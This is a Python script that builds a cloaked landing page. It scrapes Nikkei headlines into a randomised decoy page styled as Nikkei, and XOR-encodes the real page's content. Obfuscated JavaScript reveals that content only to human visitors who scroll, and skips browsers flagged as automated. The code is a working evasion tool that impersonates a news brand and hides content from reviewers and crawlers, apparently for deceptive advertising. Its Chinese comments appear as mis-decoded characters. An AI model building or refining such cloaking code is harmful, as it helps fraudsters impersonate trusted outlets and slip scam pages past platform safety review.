import os
import random
import string
import json
import shutil
import requests
import datetime
import urllib.parse
from bs4 import BeautifulSoup

# ================= é…ç½®åŒº =================
TARGET_REAL_PAGE = "index.html"  
OUTPUT_ZIP_NAME = "nikkei_polymorphic_v5"     
XOR_KEY = random.randint(10, 250) 
# ==========================================

class LPAutomatorV5Polymorphic:
    def __init__(self):
        self.dist_dir = "dist_lp"
        self.white_file = "white_template.html"
        self.map = {}
        if os.path.exists(self.dist_dir): shutil.rmtree(self.dist_dir)
        os.makedirs(self.dist_dir, exist_ok=True)

    def _rand_str(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def fetch_news_and_gen_white(self):
        """æ­¥éª¤ 1: é‡‡é›†æ–°é—»å¹¶ç”Ÿæˆå¤šæ€åŒ–çš„æ—¥ç»é£æ ¼å¤–å£³"""
        print("ğŸ“¡ æ­£åœ¨æ‰§è¡Œè§†è§‰å¤šæ€åŒ–å»ºæ¨¡...")
        url = "https://www.nikkei.com/news/category/market/"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        try:
            res = requests.get(url, headers=headers, timeout=15)
            res.encoding = 'utf-8'
            soup = BeautifulSoup(res.text, 'html.parser')
            articles = []
            for item in soup.select('article')[:18]: # å¢åŠ é‡‡é›†æ•°é‡
                title = item.find('span', class_=lambda x: x and 'title' in x)
                summary = item.find('p')
                if title:
                    articles.append({"t": title.get_text().strip(), "s": summary.get_text().strip() if summary else "å¸‚å ´ãƒ‡ãƒ¼ã‚¿ã®è©³ç´°åˆ†æ..."})
            
            random.shuffle(articles) # æ¯æ¬¡æ–°é—»æ’åºä¸åŒ

            # éšæœºç”Ÿæˆæ··æ·† CSS ç±»å
            cls = {k: self._rand_str(random.randint(5, 10)) for k in ['header', 'logo', 'nav', 'main', 'side', 'art', 'title', 'badge', 'footer']}
            
            # éšæœºå¸ƒå±€é€‰æ‹© (å·¦ä¾§è¾¹æ ã€å³ä¾§è¾¹æ ã€æˆ–æ— ä¾§è¾¹æ )
            layout_type = random.choice(['left', 'right', 'none'])
            grid_tpl = "300px 1fr" if layout_type == 'left' else "1fr 300px"
            if layout_type == 'none': grid_tpl = "1fr"

            # éšæœºè‰²è°ƒå¾®è°ƒ (æ—¥ç»æ·±è“çš„ä¸åŒé¥±å’Œåº¦)
            main_blue = f"rgb(0, {random.randint(40, 60)}, {random.randint(90, 110)})"

            css = f"""
            body {{ font-family: "Hiragino Sans", "Meiryo", sans-serif; color: #333; line-height: 1.6; margin: 0; background: #fff; }}
            .{cls['header']} {{ border-bottom: 2px solid {main_blue}; padding: 15px 5%; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; background: #fff; z-index: 100; }}
            .{cls['logo']} {{ color: {main_blue}; font-size: 24px; font-weight: 900; letter-spacing: -1px; }}
            .{cls['nav']} {{ display: flex; gap: 20px; font-size: 13px; color: #666; }}
            .{cls['main']} {{ max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: {grid_tpl}; gap: 40px; padding: 20px 5%; }}
            .{cls['art']} {{ margin-bottom: 35px; border-bottom: 1px solid #eee; padding-bottom: 25px; }}
            .{cls['badge']} {{ background: #e60012; color: #fff; font-size: 10px; padding: 2px 5px; margin-right: 10px; }}
            .{cls['title']} {{ font-size: 20px; font-weight: 900; margin: 12px 0; color: #000; }}
            .{cls['side']} {{ background: #f8f8f8; padding: 20px; border-top: 3px solid #333; height: fit-content; }}
            .{cls['footer']} {{ background: #111; color: #777; padding: 50px 5%; text-align: center; font-size: 11px; }}
            """

            html = f"""<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><title>æ—¥æœ¬çµŒæ¸ˆæ–°è</title><style>{css}</style></head><body>
            <header class="{cls['header']}"><div class="{cls['logo']}">NIKKEI <small style="font-size:10px; font-weight:normal;">Financial</small></div>
            <div class="{cls['nav']}"><div>æ ªå¼</div><div>ç‚ºæ›¿</div><div>å‚µåˆ¸</div></div></header>
            <div class="{cls['main']}">"""

            # ä¾§è¾¹æ é€»è¾‘ (å¦‚æœå¸ƒå±€éœ€è¦)
            sidebar_html = f'<aside class="{cls["side"]}"><h3>ãƒ©ãƒ³ã‚­ãƒ³ã‚°</h3><div style="font-size:13px; color:{main_blue};">ãƒ»å††ç›¸å ´ ä¹±é«˜ä¸‹ã®èƒŒæ™¯</div></aside>'
            
            if layout_type == 'left': html += sidebar_html

            html += f'<section><div style="color:#999; font-size:12px; margin-bottom:20px;">ãƒ‹ãƒ¥ãƒ¼ã‚¹é€Ÿå ±: {datetime.datetime.now().strftime("%H:%M")} æ›´æ–°</div>'
            for a in articles:
                html += f'<div class="{cls["art"]}"><span class="{cls["badge"]}">é€Ÿå ±</span><div class="{cls["title"]}">{a["t"]}</div><div style="font-size:14px;">{a["s"]}</div></div>'
            html += "</section>"

            if layout_type == 'right': html += sidebar_html

            html += f'</div><footer class="{cls["footer"]}">Â© {datetime.date.today().year} Nikkei Inc. All rights reserved.</footer></body></html>'
            
            with open(self.white_file, "w", encoding="utf-8") as f: f.write(html)
            print(f"âœ… å¤šæ€å¤–å£³å·²ç”Ÿæˆ (å¸ƒå±€ç±»å‹: {layout_type})ã€‚")
        except Exception as e:
            print(f"âŒ è§†è§‰ç”Ÿæˆå¤±è´¥: {e}")

    def scramble_and_pack(self):
        """æ­¥éª¤ 2: æ³¨å…¥ V5 çº§å¼‚æˆ–åŠ å¯†å±‚"""
        print("ğŸ” æ­£åœ¨æ³¨å…¥å¤šæ€è§£å¯†é€»è¾‘...")
        with open(self.white_file, 'r', encoding='utf-8') as f:
            w_soup = BeautifulSoup(f.read(), 'html.parser')
            w_body = "".join([str(x) for x in w_soup.body.contents]) if w_soup.body else str(w_soup)
            w_title = w_soup.title.string if w_soup.title else "Nikkei News"

        with open(TARGET_REAL_PAGE, 'r', encoding='utf-8') as f:
            r_soup = BeautifulSoup(f.read(), 'html.parser')
            for tag, attr in {'img':'src', 'link':'href', 'script':'src'}.items():
                for el in r_soup.find_all(tag):
                    src = el.get(attr)
                    if src and not src.startswith(('http', '//', 'data:')):
                        clean_src = urllib.parse.urlparse(src).path
                        dest = os.path.join(self.dist_dir, clean_src)
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        if os.path.exists(clean_src): shutil.copy(clean_src, dest)

        target_node = r_soup.find(id="main-content") or r_soup.body
        raw_html = "".join([str(x) for x in target_node.contents])
        encoded = [ord(c) ^ XOR_KEY for c in raw_html]
        
        # è§£å¯†é€»è¾‘å˜é‡å…¨æ··æ·†
        v_data, v_key, v_res, v_check, v_root = [self._rand_str(6) for _ in range(5)]

        final_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{w_title}</title>
        <style>body{{margin:0;padding:0}}#{v_root}{{min-height:215vh;background:#fff}}</style></head>
        <body><div id="{v_root}">{w_body}</div><script>
        (function(){{
            var {v_data}={json.dumps(encoded)}, {v_key}={XOR_KEY}, _r=false, _t=false;
            function _ex(){{
                if(_r||navigator.webdriver||document.visibilityState!=='visible')return;
                _r=true; try{{
                    var {v_res}={v_data}.map(function(c){{return String.fromCharCode(c^{v_key})}}).join('');
                    document.body.innerHTML={v_res};window.scrollTo(0,0);
                }}catch(e){{console.clear();}}
            }}
            function {v_check}(){{ if(!_t&&window.scrollY>500){{_t=true;setTimeout(_ex,3200);}} }}
            window.addEventListener('scroll',{v_check});window.addEventListener('touchmove',{v_check});
        }})();</script></body></html>"""

        with open(os.path.join(self.dist_dir, "index.html"), "w", encoding="utf-8") as f: 
            f.write(final_html)

    def create_zip(self):
        shutil.make_archive(OUTPUT_ZIP_NAME, 'zip', self.dist_dir)
        print(f"âœ¨ å¤šæ€åŒ–äº§ç‰©æ‰“åŒ…æˆåŠŸ: {OUTPUT_ZIP_NAME}.zip")

if __name__ == "__main__":
    if not os.path.exists(TARGET_REAL_PAGE):
        print(f"âŒ é”™è¯¯: æ‰¾ä¸åˆ° {TARGET_REAL_PAGE}")
    else:
        flow = LPAutomatorV5Polymorphic()
        flow.fetch_news_and_gen_white()
        flow.scramble_and_pack()
        flow.create_zip()
        input("\n[V5.1 å¤šæ€ç‰ˆ] å¤„ç†ç»“æŸï¼ŒæŒ‰å›è½¦é€€å‡º...")
